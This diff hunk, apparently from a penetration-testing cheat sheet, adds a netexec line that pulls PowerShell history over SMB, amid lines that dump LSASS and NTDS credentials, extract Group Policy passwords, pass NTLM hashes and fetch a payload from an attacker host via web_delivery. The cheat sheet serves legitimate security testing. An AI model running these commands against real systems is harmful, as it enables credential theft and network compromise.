@@ -655,6 +655,7 @@ $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=http://<LHOST>/<FILE>
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
 $ netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds --user <USERNAME>
